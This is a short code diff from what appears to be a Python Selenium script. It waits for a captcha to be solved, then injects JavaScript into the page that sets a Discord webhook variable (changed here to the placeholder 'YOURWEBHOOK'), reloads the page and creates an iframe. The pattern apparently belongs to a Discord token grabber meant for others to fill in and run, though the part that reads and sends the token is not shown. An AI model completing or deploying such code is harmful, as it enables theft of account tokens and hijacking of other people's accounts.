@@ -36,7 +36,7 @@ input("press enter if you solved the captcha: ")
 time.sleep(5)
 
 driver.execute_script('''
-var discordWebhook = "";
+var discordWebhook = "YOURWEBHOOK";
 location.reload();
 var i = document.createElement('iframe');
 document.body.appendChild(i);
